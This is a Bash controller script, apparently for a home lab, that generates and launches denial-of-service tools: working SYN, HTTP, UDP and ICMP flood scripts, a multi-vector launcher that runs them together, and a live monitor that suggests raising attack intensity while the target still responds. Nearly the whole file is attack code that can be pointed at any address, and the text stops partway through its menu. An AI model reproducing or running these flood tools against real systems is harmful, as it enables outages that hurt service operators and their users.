#!/bin/bash

# ============================================================================
# ENTERPRISE DDoS ATTACK CONTROLLER v3.0
# Kali Linux - 192.168.1.6
# ============================================================================

# Configuration
CONFIG_DIR="$HOME/ddos-enterprise-lab/kali-attacker"
ATTACKS_DIR="$CONFIG_DIR/attacks"
TOOLS_DIR="$CONFIG_DIR/tools"
LOGS_DIR="$CONFIG_DIR/logs"
ANALYSIS_DIR="$CONFIG_DIR/analysis"

# Default target
TARGET="192.168.1.5"

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
MAGENTA='\033[0;35m'
CYAN='\033[0;36m'
NC='\033[0m'

# Ensure directories exist
mkdir -p "$ATTACKS_DIR" "$TOOLS_DIR" "$LOGS_DIR" "$ANALYSIS_DIR"

# Logging function
log_attack() {
    local level=$1
    local message=$2
    local timestamp=$(date '+%Y-%m-%d %H:%M:%S')
    
    case $level in
        "INFO") color=$GREEN ;;
        "WARN") color=$YELLOW ;;
        "ERROR") color=$RED ;;
        "DEBUG") color=$CYAN ;;
        "ATTACK") color=$MAGENTA ;;
        *) color=$NC ;;
    esac
    
    echo -e "${color}[$timestamp] [$level] $message${NC}"
    echo "[$timestamp] [$level] $message" >> "$LOGS_DIR/attack_controller.log"
}

# Check for required tools
check_tools() {
    log_attack "INFO" "Checking required tools..."
    
    local missing=()
    
    # Check hping3
    if ! command -v hping3 &> /dev/null; then
        missing+=("hping3")
    fi
    
    # Check nmap
    if ! command -v nmap &> /dev/null; then
        missing+=("nmap")
    fi
    
    # Check curl
    if ! command -v curl &> /dev/null; then
        missing+=("curl")
    fi
    
    # Check python3
    if ! command -v python3 &> /dev/null; then
        missing+=("python3")
    fi
    
    if [ ${#missing[@]} -gt 0 ]; then
        log_attack "WARN" "Missing tools: ${missing[*]}"
        echo -e "${YELLOW}[+] Install missing tools? (y/N): ${NC}"
        read -p "" choice
        if [[ $choice == [yY] ]]; then
            sudo apt update
            sudo apt install -y ${missing[@]}
        fi
    else
        log_attack "INFO" "All required tools are installed"
    fi
}

# Install Python dependencies
install_python_deps() {
    log_attack "INFO" "Checking Python dependencies..."
    
    if ! python3 -c "import requests" 2>/dev/null; then
        log_attack "WARN" "Python requests module not found"
        echo -e "${YELLOW}[+] Install Python dependencies? (y/N): ${NC}"
        read -p "" choice
        if [[ $choice == [yY] ]]; then
            pip3 install requests colorama
        fi
    fi
}

# Check target connectivity
check_target() {
    local target=$1
    
    log_attack "INFO" "Checking target: $target"
    
    echo -e "${CYAN}[+] Ping test...${NC}"
    if ping -c 2 -W 1 "$target" > /dev/null 2>&1; then
        echo -e "  ${GREEN}✅ Reachable${NC}"
    else
        echo -e "  ${RED}❌ Not reachable${NC}"
        return 1
    fi
    
    echo -e "${CYAN}[+] Web server test...${NC}"
    if curl -s --max-time 3 "http://$target/" > /dev/null 2>&1; then
        echo -e "  ${GREEN}✅ Web server responding${NC}"
    else
        echo -e "  ${YELLOW}⚠️  Web server may not be responding${NC}"
    fi
    
    echo -e "${CYAN}[+] Port scan (quick)...${NC}"
    echo -n "  Open ports: "
    
    # Check common ports
    ports=(80 443 22 21 25 53)
    open_ports=()
    
    for port in "${ports[@]}"; do
        if nc -z -w1 "$target" "$port" 2>/dev/null; then
            open_ports+=("$port")
        fi
    done
    
    if [ ${#open_ports[@]} -gt 0 ]; then
        echo -e "${GREEN}${open_ports[*]}${NC}"
    else
        echo -e "${YELLOW}No common ports open${NC}"
    fi
    
    return 0
}

# Create attack scripts if they don't exist
create_attack_scripts() {
    log_attack "DEBUG" "Creating attack scripts..."
    
    # SYN Flood script
    if [ ! -f "$ATTACKS_DIR/syn_flood.py" ]; then
        cat > "$ATTACKS_DIR/syn_flood.py" << 'SYN_FLOOD'
#!/usr/bin/python3
"""
SYN Flood Attack Script
"""

import sys
import time
import random
import threading
import os

def syn_flood(target_ip, target_port=80, duration=60, threads=10):
    print(f"[+] Starting SYN Flood attack")
    print(f"[+] Target: {target_ip}:{target_port}")
    print(f"[+] Duration: {duration} seconds")
    print(f"[+] Threads: {threads}")
    print("[+] Mode: Using hping3 for packet generation")
    print("=" * 50)
    
    # Calculate packets per thread
    total_packets = duration * 1000  # Estimate 1000 packets per second
    packets_per_thread = total_packets // threads
    
    print(f"[+] Estimated packets: {total_packets:,}")
    print("")
    
    # Start hping3 processes
    processes = []
    start_time = time.time()
    
    for i in range(threads):
        cmd = f"hping3 -S -p {target_port} --flood {target_ip} 2>/dev/null"
        pid = os.system(f"{cmd} &")
        processes.append(pid)
        print(f"[Thread {i+1}] Started (PID estimate)")
    
    print("")
    print("[+] Attack running...")
    
    # Monitor duration
    try:
        while time.time() - start_time < duration:
            elapsed = time.time() - start_time
            remaining = duration - elapsed
            print(f"\r[+] Time: {elapsed:.1f}s / {duration}s | Remaining: {remaining:.1f}s", end="")
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[!] Attack interrupted by user")
    
    # Stop attack
    print("\n[+] Stopping attack...")
    os.system("pkill -f hping3 2>/dev/null")
    
    print("[+] Attack completed")
    print("=" * 50)

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 syn_flood.py <target_ip> [duration] [threads]")
        print("Example: python3 syn_flood.py 192.168.1.5 60 10")
        sys.exit(1)
    
    target = sys.argv[1]
    duration = int(sys.argv[2]) if len(sys.argv) > 2 else 60
    threads = int(sys.argv[3]) if len(sys.argv) > 3 else 10
    
    # Check if running as root
    if os.geteuid() != 0:
        print("[!] Warning: SYN flood requires root privileges for best results")
        print("[!] Some features may not work without sudo")
    
    syn_flood(target, duration=duration, threads=threads)
SYN_FLOOD
        chmod +x "$ATTACKS_DIR/syn_flood.py"
        log_attack "INFO" "Created SYN flood script"
    fi
    
    # HTTP Flood script
    if [ ! -f "$ATTACKS_DIR/http_flood.py" ]; then
        cat > "$ATTACKS_DIR/http_flood.py" << 'HTTP_FLOOD'
#!/usr/bin/python3
"""
HTTP Flood Attack Script
"""

import sys
import time
import random
import threading
import requests
from concurrent.futures import ThreadPoolExecutor

class HTTPFlood:
    def __init__(self, target_url, duration=60, max_workers=50):
        self.target_url = target_url if target_url.startswith('http') else f'http://{target_url}'
        self.duration = duration
        self.max_workers = max_workers
        self.request_count = 0
        self.success_count = 0
        self.running = True
        
        # User agents
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
        ]
        
        # Paths
        self.paths = ['/', '/index.html', '/api/status', '/slow', '/error']
    
    def make_request(self, session):
        try:
            headers = {
                'User-Agent': random.choice(self.user_agents),
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Connection': 'keep-alive',
            }
            
            url = self.target_url + random.choice(self.paths)
            if random.random() > 0.5:
                url += f'?id={random.randint(1,1000)}'
            
            response = session.get(url, headers=headers, timeout=2)
            
            self.request_count += 1
            self.success_count += 1
            
            return True
        except:
            self.request_count += 1
            return False
    
    def worker(self, worker_id, session):
        requests_made = 0
        while self.running:
            self.make_request(session)
            requests_made += 1
            
            if requests_made % 100 == 0:
                print(f"[Worker {worker_id}] Requests: {requests_made}")
            
            time.sleep(random.uniform(0.01, 0.1))
    
    def start(self):
        print(f"[+] Starting HTTP Flood attack")
        print(f"[+] Target: {self.target_url}")
        print(f"[+] Duration: {self.duration} seconds")
        print(f"[+] Workers: {self.max_workers}")
        print("=" * 50)
        
        session = requests.Session()
        
        with ThreadPoolExecutor(max_workers=self.max_workers) as executor:
            futures = []
            for i in range(self.max_workers):
                future = executor.submit(self.worker, i, session)
                futures.append(future)
            
            start_time = time.time()
            try:
                while time.time() - start_time < self.duration:
                    elapsed = time.time() - start_time
                    remaining = self.duration - elapsed
                    
                    if elapsed > 0:
                        rps = self.request_count / elapsed
                    else:
                        rps = 0
                    
                    success_rate = (self.success_count / self.request_count * 100) if self.request_count > 0 else 0
                    
                    print(f"\r[+] Time: {elapsed:.1f}s | Requests: {self.request_count:,} | "
                          f"RPS: {rps:.1f} | Success: {success_rate:.1f}%", end="")
                    
                    time.sleep(0.5)
            except KeyboardInterrupt:
                print("\n[!] Attack interrupted by user")
            
            self.running = False
            executor.shutdown(wait=True)
        
        print(f"\n\n[+] Attack completed")
        print(f"[+] Total requests: {self.request_count:,}")
        print(f"[+] Successful: {self.success_count:,}")
        print(f"[+] Success rate: {(self.success_count/self.request_count*100 if self.request_count > 0 else 0):.1f}%")
        print("=" * 50)

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 http_flood.py <target_url> [duration] [workers]")
        print("Example: python3 http_flood.py http://192.168.1.5 60 50")
        sys.exit(1)
    
    target = sys.argv[1]
    duration = int(sys.argv[2]) if len(sys.argv) > 2 else 60
    workers = int(sys.argv[3]) if len(sys.argv) > 3 else 50
    
    attacker = HTTPFlood(target, duration=duration, max_workers=workers)
    attacker.start()
HTTP_FLOOD
        chmod +x "$ATTACKS_DIR/http_flood.py"
        log_attack "INFO" "Created HTTP flood script"
    fi
    
    # UDP Flood script
    if [ ! -f "$ATTACKS_DIR/udp_flood.sh" ]; then
        cat > "$ATTACKS_DIR/udp_flood.sh" << 'UDP_FLOOD'
#!/bin/bash

# UDP Flood Attack Script

TARGET="$1"
DURATION="${2:-60}"
THREADS="${3:-5}"

if [ -z "$TARGET" ]; then
    echo "Usage: ./udp_flood.sh <target_ip> [duration] [threads]"
    echo "Example: ./udp_flood.sh 192.168.1.5 60 5"
    exit 1
fi

# Check if running as root
if [ "$EUID" -ne 0 ]; then
    echo "[!] Warning: UDP flood works better with root privileges"
fi

echo "[+] Starting UDP Flood attack"
echo "[+] Target: $TARGET"
echo "[+] Duration: $DURATION seconds"
echo "[+] Threads: $THREADS"
echo "[+] Ports: 53, 123, 80, 443, 8080 (rotating)"
echo "=" * 50

# Ports to target
PORTS=(53 123 80 443 8080 9000)

# Function to send UDP packets
send_udp() {
    local thread_id=$1
    local port=$2
    
    local packet_count=0
    local start_time=$(date +%s)
    
    while [ $(($(date +%s) - start_time)) -lt $DURATION ]; do
        echo "UDP_FLOOD_$(date +%s)_${RANDOM}_T${thread_id}" | \
            timeout 0.5 nc -u -w1 "$TARGET" "$port" 2>/dev/null &
        
        packet_count=$((packet_count + 1))
        
        if [ $((packet_count % 100)) -eq 0 ]; then
            echo "[Thread $thread_id] Port $port: $packet_count packets"
        fi
        
        sleep 0.01
    done
    
    echo "[Thread $thread_id] Finished: $packet_count packets to port $port"
}

# Start attack threads
PIDS=()
for ((i=1; i<=THREADS; i++)); do
    port=${PORTS[$(( (i-1) % ${#PORTS[@]} ))]}
    send_udp $i $port &
    PIDS+=($!)
    echo "[+] Started thread $i attacking port $port (PID: ${PIDS[-1]})"
    sleep 0.1
done

echo ""
echo "[+] All threads started"
echo "[+] Attack will run for $DURATION seconds"
echo ""
echo "Press Ctrl+C to stop attack early"
echo ""

# Wait for duration
sleep $DURATION

# Cleanup
echo ""
echo "[+] Stopping attack..."
kill ${PIDS[@]} 2>/dev/null
pkill -f "nc.*$TARGET" 2>/dev/null

echo "[+] Attack completed"
echo "=" * 50
UDP_FLOOD
        chmod +x "$ATTACKS_DIR/udp_flood.sh"
        log_attack "INFO" "Created UDP flood script"
    fi
    
    # ICMP Flood script
    if [ ! -f "$ATTACKS_DIR/icmp_flood.sh" ]; then
        cat > "$ATTACKS_DIR/icmp_flood.sh" << 'ICMP_FLOOD'
#!/bin/bash

# ICMP Flood Attack Script

TARGET="$1"
DURATION="${2:-60}"
PROCESSES="${3:-10}"

if [ -z "$TARGET" ]; then
    echo "Usage: ./icmp_flood.sh <target_ip> [duration] [processes]"
    echo "Example: ./icmp_flood.sh 192.168.1.5 60 10"
    exit 1
fi

# Check if running as root
if [ "$EUID" -ne 0 ]; then
    echo "[!] Warning: ICMP flood requires root privileges"
    echo "[!] Run with: sudo ./icmp_flood.sh $TARGET $DURATION $PROCESSES"
    exit 1
fi

echo "[+] Starting ICMP Flood attack"
echo "[+] Target: $TARGET"
echo "[+] Duration: $DURATION seconds"
echo "[+] Processes: $PROCESSES"
echo "=" * 50

# Start ping processes
PIDS=()
for ((i=1; i<=PROCESSES; i++)); do
    # Vary packet sizes
    size=$(( (i % 4) * 512 + 64 ))
    
    ping -f -s $size "$TARGET" > /dev/null 2>&1 &
    PIDS+=($!)
    echo "[+] Started process $i with size: $size bytes (PID: ${PIDS[-1]})"
done

echo ""
echo "[+] All processes started"
echo "[+] Attack will run for $DURATION seconds"
echo ""
echo "Press Ctrl+C to stop attack early"
echo ""

# Monitor progress
start_time=$(date +%s)
while [ $(($(date +%s) - start_time)) -lt $DURATION ]; do
    elapsed=$(( $(date +%s) - start_time ))
    remaining=$(( DURATION - elapsed ))
    
    running=$(ps aux | grep -c "ping.*$TARGET")
    
    echo -ne "\r[+] Time: ${elapsed}s/${DURATION}s | Running processes: ${running}"
    
    sleep 1
done

echo ""
echo ""
echo "[+] Stopping attack..."

# Kill all ping processes
for pid in "${PIDS[@]}"; do
    kill $pid 2>/dev/null
done

pkill -f "ping.*$TARGET" 2>/dev/null

echo "[+] Attack completed"
echo "=" * 50
ICMP_FLOOD
        chmod +x "$ATTACKS_DIR/icmp_flood.sh"
        log_attack "INFO" "Created ICMP flood script"
    fi
    
    # Multi-Vector Attack script
    if [ ! -f "$ATTACKS_DIR/full_ddos_suite.sh" ]; then
        cat > "$ATTACKS_DIR/full_ddos_suite.sh" << 'MULTI_VECTOR'
#!/bin/bash

# Multi-Vector DDoS Attack Suite

TARGET="$1"
DURATION="${2:-120}"

if [ -z "$TARGET" ]; then
    echo "Usage: ./full_ddos_suite.sh <target_ip> [duration]"
    echo "Example: ./full_ddos_suite.sh 192.168.1.5 120"
    exit 1
fi

echo "================================================"
echo "      MULTI-VECTOR DDoS ATTACK SUITE"
echo "================================================"
echo "Target: $TARGET"
echo "Duration: $DURATION seconds"
echo ""
echo "This will start multiple attack vectors simultaneously:"
echo "1. SYN Flood"
echo "2. HTTP Flood"
echo "3. UDP Flood"
echo "4. ICMP Flood"
echo ""
echo "⚠️  WARNING: This is a heavy attack!"
echo ""

read -p "Start attack? (y/N): " confirm
if [[ ! $confirm =~ ^[Yy]$ ]]; then
    echo "Attack cancelled"
    exit 0
fi

echo ""
echo "[+] Starting all attack vectors..."
echo ""

# Get script directory
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

# Start SYN Flood (requires root)
echo "[1] Starting SYN Flood..."
if [ "$EUID" -eq 0 ]; then
    timeout $DURATION "$SCRIPT_DIR/syn_flood.py" "$TARGET" "$DURATION" 10 &
    SYN_PID=$!
    echo "    PID: $SYN_PID"
else
    echo "    Skipped (requires root)"
fi

# Start HTTP Flood
echo "[2] Starting HTTP Flood..."
timeout $DURATION "$SCRIPT_DIR/http_flood.py" "http://$TARGET" "$DURATION" 50 &
HTTP_PID=$!
echo "    PID: $HTTP_PID"

# Start UDP Flood (requires root)
echo "[3] Starting UDP Flood..."
if [ "$EUID" -eq 0 ]; then
    timeout $DURATION "$SCRIPT_DIR/udp_flood.sh" "$TARGET" "$DURATION" 5 &
    UDP_PID=$!
    echo "    PID: $UDP_PID"
else
    echo "    Skipped (requires root)"
fi

# Start ICMP Flood (requires root)
echo "[4] Starting ICMP Flood..."
if [ "$EUID" -eq 0 ]; then
    timeout $DURATION "$SCRIPT_DIR/icmp_flood.sh" "$TARGET" "$DURATION" 10 &
    ICMP_PID=$!
    echo "    PID: $ICMP_PID"
else
    echo "    Skipped (requires root)"
fi

echo ""
echo "[+] All attacks started"
echo "[+] Attack will run for $DURATION seconds"
echo ""
echo "Monitoring attack progress..."
echo ""

# Monitor progress
start_time=$(date +%s)
while [ $(($(date +%s) - start_time)) -lt $DURATION ]; do
    elapsed=$(( $(date +%s) - start_time ))
    remaining=$(( DURATION - elapsed ))
    
    # Count running attack processes
    syn_count=$(ps aux | grep -c "[s]yn_flood.py.*$TARGET")
    http_count=$(ps aux | grep -c "[h]ttp_flood.py.*$TARGET")
    udp_count=$(ps aux | grep -c "[u]dp_flood.sh.*$TARGET")
    icmp_count=$(ps aux | grep -c "[i]cmp_flood.sh.*$TARGET")
    
    clear
    echo "================================================"
    echo "      ATTACK PROGRESS MONITOR"
    echo "================================================"
    echo "Target: $TARGET"
    echo "Elapsed: ${elapsed}s / ${DURATION}s"
    echo "Remaining: ${remaining}s"
    echo ""
    echo "Attack Status:"
    echo "──────────────"
    echo "SYN Flood:   $(if [ $syn_count -gt 0 ]; then echo "✅ ACTIVE"; else echo "❌ INACTIVE"; fi)"
    echo "HTTP Flood:  $(if [ $http_count -gt 0 ]; then echo "✅ ACTIVE"; else echo "❌ INACTIVE"; fi)"
    echo "UDP Flood:   $(if [ $udp_count -gt 0 ]; then echo "✅ ACTIVE"; else echo "❌ INACTIVE"; fi)"
    echo "ICMP Flood:  $(if [ $icmp_count -gt 0 ]; then echo "✅ ACTIVE"; else echo "❌ INACTIVE"; fi)"
    echo ""
    echo "Press Ctrl+C to stop all attacks"
    echo "================================================"
    
    sleep 2
done

echo ""
echo "[+] Attack duration completed"
echo "[+] Stopping all attacks..."

# Cleanup
pkill -f "syn_flood.py.*$TARGET" 2>/dev/null
pkill -f "http_flood.py.*$TARGET" 2>/dev/null
pkill -f "udp_flood.sh.*$TARGET" 2>/dev/null
pkill -f "icmp_flood.sh.*$TARGET" 2>/dev/null
pkill -f "hping3.*$TARGET" 2>/dev/null
pkill -f "ping.*$TARGET" 2>/dev/null
pkill -f "nc.*$TARGET" 2>/dev/null

echo "[+] All attacks stopped"
echo ""
echo "================================================"
echo "      ATTACK COMPLETED"
echo "================================================"
echo "Check target server for impact analysis"
echo "Logs saved to: ~/ddos-enterprise-lab/kali-attacker/logs/"
echo "================================================"
MULTI_VECTOR
        chmod +x "$ATTACKS_DIR/full_ddos_suite.sh"
        log_attack "INFO" "Created multi-vector attack script"
    fi
}

# Start attack monitoring
start_attack_monitor() {
    local target=$1
    
    log_attack "INFO" "Starting attack monitor for target: $target"
    
    cat > "$MONITOR_DIR/attack_monitor.sh" << 'MONITOR'
#!/bin/bash

# Real-time Attack Monitor

TARGET="$1"
if [ -z "$TARGET" ]; then
    TARGET="192.168.1.5"
fi

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
NC='\033[0m'

# Function to calculate attack metrics
calculate_metrics() {
    # Count attack processes
    syn_procs=$(ps aux | grep -c "[s]yn_flood")
    http_procs=$(ps aux | grep -c "[h]ttp_flood")
    udp_procs=$(ps aux | grep -c "[u]dp_flood")
    icmp_procs=$(ps aux | grep -c "[i]cmp_flood")
    hping_procs=$(ps aux | grep -c "[h]ping3.*$TARGET")
    ping_procs=$(ps aux | grep -c "[p]ing.*$TARGET")
    
    total_attacks=$((syn_procs + http_procs + udp_procs + icmp_procs + hping_procs + ping_procs))
    
    # Check target response
    response_time=0
    if ping -c 1 -W 1 "$TARGET" > /dev/null 2>&1; then
        ping_status="✅"
        response_time=$(ping -c 1 -W 1 "$TARGET" | grep "time=" | cut -d'=' -f4 | cut -d' ' -f1)
    else
        ping_status="❌"
    fi
    
    # Check web server
    http_start=$(date +%s%N)
    if curl -s --max-time 3 "http://$TARGET/" > /dev/null 2>&1; then
        http_status="✅"
        http_end=$(date +%s%N)
        http_time=$(( (http_end - http_start) / 1000000 ))
    else
        http_status="❌"
        http_time=9999
    fi
    
    echo "$total_attacks:$ping_status:$response_time:$http_status:$http_time:$syn_procs:$http_procs:$udp_procs:$icmp_procs"
}

# Main monitoring loop
while true; do
    clear
    
    metrics=$(calculate_metrics)
    IFS=':' read -r total_attacks ping_status response_time http_status http_time syn_procs http_procs udp_procs icmp_procs <<< "$metrics"
    
    # Display header
    echo -e "${BLUE}╔════════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${BLUE}║                  ATTACK MONITOR - REAL TIME                   ║${NC}"
    echo -e "${BLUE}║                  $(date)                                       ║${NC}"
    echo -e "${BLUE}╚════════════════════════════════════════════════════════════════╝${NC}"
    echo ""
    
    # Target information
    echo -e "${CYAN}🎯 TARGET: $TARGET${NC}"
    echo "────────────────────────────────────────"
    echo -e "Ping: $ping_status ${response_time}ms"
    echo -e "HTTP: $http_status ${http_time}ms"
    echo ""
    
    # Attack status
    echo -e "${CYAN}⚡ ACTIVE ATTACKS: $total_attacks${NC}"
    echo "────────────────────────────────────────"
    
    if [ $syn_procs -gt 0 ]; then
        echo -e "SYN Flood:    ${RED}ACTIVE ($syn_procs)${NC}"
    else
        echo -e "SYN Flood:    ${GREEN}INACTIVE${NC}"
    fi
    
    if [ $http_procs -gt 0 ]; then
        echo -e "HTTP Flood:   ${RED}ACTIVE ($http_procs)${NC}"
    else
        echo -e "HTTP Flood:   ${GREEN}INACTIVE${NC}"
    fi
    
    if [ $udp_procs -gt 0 ]; then
        echo -e "UDP Flood:    ${RED}ACTIVE ($udp_procs)${NC}"
    else
        echo -e "UDP Flood:    ${GREEN}INACTIVE${NC}"
    fi
    
    if [ $icmp_procs -gt 0 ]; then
        echo -e "ICMP Flood:   ${RED}ACTIVE ($icmp_procs)${NC}"
    else
        echo -e "ICMP Flood:   ${GREEN}INACTIVE${NC}"
    fi
    
    echo ""
    
    # System load
    echo -e "${CYAN}📊 SYSTEM LOAD${NC}"
    echo "────────────────────────────────────────"
    echo "Load: $(uptime | awk -F'load average:' '{print $2}')"
    echo "Memory: $(free -h | awk '/^Mem:/ {print $3"/"$2}')"
    echo ""
    
    # Network connections to target
    echo -e "${CYAN}🔗 CONNECTIONS TO TARGET${NC}"
    echo "────────────────────────────────────────"
    netstat -ant 2>/dev/null | grep "$TARGET" | head -5 | while read line; do
        echo "$line"
    done
    
    if [ $(netstat -ant 2>/dev/null | grep -c "$TARGET") -eq 0 ]; then
        echo "No active connections to target"
    fi
    
    echo ""
    
    # Recommendations based on target response
    echo -e "${CYAN}💡 RECOMMENDATIONS${NC}"
    echo "────────────────────────────────────────"
    
    if [ "$http_status" = "❌" ] || [ "$ping_status" = "❌" ]; then
        echo -e "${RED}✅ Target appears to be down or heavily impacted${NC}"
        echo "Consider stopping attacks for analysis"
    elif [ $http_time -gt 1000 ]; then
        echo -e "${YELLOW}⚠️  Target is slowing down (${http_time}ms response)${NC}"
        echo "Attack is having significant impact"
    else
        echo -e "${GREEN}✅ Target is still responding normally${NC}"
        echo "Continue or increase attack intensity"
    fi
    
    echo ""
    
    # Footer
    echo -e "${BLUE}════════════════════════════════════════════════════════════════${NC}"
    echo -e "${GREEN}Monitoring... (Press Ctrl+C to exit) | Refreshing every 3 seconds${NC}"
    
    sleep 3
done
MONITOR
    
    chmod +x "$MONITOR_DIR/attack_monitor.sh"
    
    # Start monitor in background
    "$MONITOR_DIR/attack_monitor.sh" "$target" &
    MONITOR_PID=$!
    
    echo $MONITOR_PID > "$MONITOR_DIR/attack_monitor.pid"
    echo -e "${GREEN}[+] Attack monitor started (PID: $MONITOR_PID)${NC}"
}

# Stop attack monitoring
stop_attack_monitor() {
    if [ -f "$MONITOR_DIR/attack_monitor.pid" ]; then
        monitor_pid=$(cat "$MONITOR_DIR/attack_monitor.pid")
        if kill -0 $monitor_pid 2>/dev/null; then
            kill $monitor_pid
            log_attack "INFO" "Attack monitor stopped (PID: $monitor_pid)"
            rm -f "$MONITOR_DIR/attack_monitor.pid"
        fi
    fi
}

# Cleanup all attacks
cleanup_attacks() {
    log_attack "INFO" "Cleaning up all attack processes..."
    
    echo -e "${YELLOW}[+] Stopping all attack processes...${NC}"
    
    # Kill attack scripts
    pkill -f "syn_flood.py" 2>/dev/null
    pkill -f "http_flood.py" 2>/dev/null
    pkill -f "udp_flood.sh" 2>/dev/null
    pkill -f "icmp_flood.sh" 2>/dev/null
    pkill -f "full_ddos_suite.sh" 2>/dev/null
    
    # Kill underlying tools
    pkill -f "hping3" 2>/dev/null
    pkill -f "ping.*flood" 2>/dev/null
    pkill -f "nc.*-u" 2>/dev/null
    
    # Stop monitor
    stop_attack_monitor
    
    echo -e "${GREEN}[+] All attacks cleaned up${NC}"
}

# Collect attack evidence
collect_attack_evidence() {
    local attack_id=$(date +%Y%m%d_%H%M%S)
    local evidence_dir="$ANALYSIS_DIR/attack_$attack_id"
    
    mkdir -p "$evidence_dir"
    
    log_attack "INFO" "Collecting attack evidence in: $evidence_dir"
    
    echo -e "${CYAN}[+] Collecting system information...${NC}"
    uname -a > "$evidence_dir/system_info.txt"
    
    echo -e "${CYAN}[+] Collecting network information...${NC}"
    ip addr show > "$evidence_dir/network_info.txt"
    route -n >> "$evidence_dir/network_info.txt"
    
    echo -e "${CYAN}[+] Collecting attack logs...${NC}"
    cp "$LOGS_DIR"/*.log "$evidence_dir/" 2>/dev/null
    
    echo -e "${CYAN}[+] Collecting process information...${NC}"
    ps aux > "$evidence_dir/processes.txt"
    
    echo -e "${CYAN}[+] Collecting network connections...${NC}"
    netstat -ant > "$evidence_dir/connections.txt"
    
    # Create summary report
    cat > "$evidence_dir/attack_report.md" << 'REPORT'
# DDoS ATTACK EVIDENCE REPORT

## Attack Information
- Attack ID: $attack_id
- Date: $(date)
- Attacker: $(hostname)
- IP Address: $(hostname -I | cut -d' ' -f1)
- Target: $TARGET

## Evidence Collected
1. System Information
2. Network Configuration
3. Attack Logs
4. Running Processes
5. Network Connections

## Attack Details
Evidence collected from DDoS attack simulation.

## Notes
For educational purposes only.
All attacks performed in controlled lab environment.

## Integrity
Evidence collected at: $(date)
REPORT
    
    echo -e "${GREEN}[+] Evidence collected in: $evidence_dir${NC}"
    echo ""
    ls -la "$evidence_dir"
}

# Display main menu
show_menu() {
    while true; do
        clear
        
        echo -e "${BLUE}╔══════════════════════════════════════════════════════════╗${NC}"
        echo -e "${BLUE}║         ENTERPRISE DDoS ATTACK CONTROLLER v3.0          ║${NC}"
        echo -e "${BLUE}║               Kali Linux - $(hostname)                  ║${NC}"
        echo -e "${BLUE}╚══════════════════════════════════════════════════════════╝${NC}"
        echo ""
        
        echo -e "${CYAN}🎯 CURRENT TARGET: ${YELLOW}$TARGET${NC}"
        echo ""
        
        echo -e "${GREEN}MAIN MENU${NC}"
        echo "──────────"
        echo "1. 🔍 Target Reconnaissance"
        echo "2. ⚡ Quick Attack Test"
        echo "3. 💣 SYN Flood Attack"
        echo "4. 🌊 HTTP Flood Attack"
        echo "5. 📦 UDP Flood Attack"
        echo "6. 🏓 ICMP Flood Attack"
        echo "7. 🎯 Multi-Vector Attack (All)"
        echo "8. 📊 Start Attack Monitor"
        echo "9. 🛑 Stop Attack Monitor"
        echo "10. 🧹 Cleanup All Attacks"
        echo "11. 📋 Collect Attack Evidence"
        echo "12. ⚙️  Configure Target"
        echo "13. 🚪 Exit"
        echo ""
        
        read -p "Select option [1-13]: " choice
        
        case $choice in
            1)
                echo ""
                check_target "$TARGET"
                echo ""
                read -p "Press Enter to continue..."
                ;;
                
            2)
                echo ""
                echo -e "${YELLOW}[+] Starting quick attack test (10 seconds)...${NC}"
                
                if [ "$EUID" -eq 0 ]; then
                    timeout 10 "$ATTACKS_DIR/syn_flood.py" "$TARGET" 10 5 &
                fi
                
                timeout 10 "$ATTACKS_DIR/http_flood.py" "http://$TARGET" 10 20 &
                
                echo "[+] Attacks started for 10 seconds"
                echo "[+] Check target monitoring for impact"
                echo ""
                read -p "Press Enter to continue..."
                ;;
                
            3)
                echo ""
                read -p "Duration (seconds) [60]: " duration
                duration=${duration:-60}
                
                read -p "Threads [10]: " threads
                threads=${threads:-10}
                
                echo ""
                echo -e "${YELLOW}[+] Starting SYN Flood attack...${NC}"
                
                if [ "$EUID" -eq 0 ]; then
                    "$ATTACKS_DIR/syn_flood.py" "$TARGET" "$duration" "$threads"
                else
                    echo -e "${RED}[!] SYN Flood requires root privileges${NC}"
                    echo -e "${YELLOW}[+] Run with: sudo $ATTACKS_DIR/syn_flood.py $TARGET $duration $threads${NC}"
                fi
                
                echo ""
                read -p "Press Enter to continue..."
                ;;
                
            4)
                echo ""
                read -p "Duration (seconds) [60]: " duration
                duration=${duration:-60}
                
                read -p "Workers [50]: " workers
                workers=${workers:-50}
                
                echo ""
                echo -e "${YELLOW}[+] Starting HTTP Flood attack...${NC}"
                "$ATTACKS_DIR/http_flood.py" "http://$TARGET" "$duration" "$workers"
                
                echo ""
                read -p "Press Enter to continue..."
                ;;
                
            5)
                echo ""
                read -p "Duration (seconds) [60]: " duration
                duration=${duration:-60}
                
                read -p "Threads [5]: " threads
                threads=${threads:-5}
                
                echo ""
                echo -e "${YELLOW}[+] Starting UDP Flood attack...${NC}"
                
                if [ "$EUID" -eq 0 ]; then
                    "$ATTACKS_DIR/udp_flood.sh" "$TARGET" "$duration" "$threads"
                else
                    echo -e "${RED}[!] UDP Flood requires root privileges${NC}"
                    echo -e "${YELLOW}[+] Run with: sudo $ATTACKS_DIR/udp_flood.sh $TARGET $duration $threads${NC}"
                fi
                
                echo ""
                read -p "Press Enter to continue..."
                ;;
                
            6)
                echo ""
                read -p "Duration (seconds) [60]: " duration
                duration=${duration:-60}
                
                read -p "Processes [10]: " processes
                processes=${processes:-10}
                
                echo ""
                echo -e "${YELLOW}[+] Starting ICMP Flood attack...${NC}"
                
                if [ "$EUID" -eq 0 ]; then
                    "$ATTACKS_DIR/icmp_flood.sh" "$TARGET" "$duration" "$processes"
                else
                    echo -e "${RED}[!] ICMP Flood requires root privileges${NC}"
                    echo -e "${YELLOW}[+] Run with: sudo $ATTACKS_DIR/icmp_flood.sh $TARGET $duration $processes${NC}"
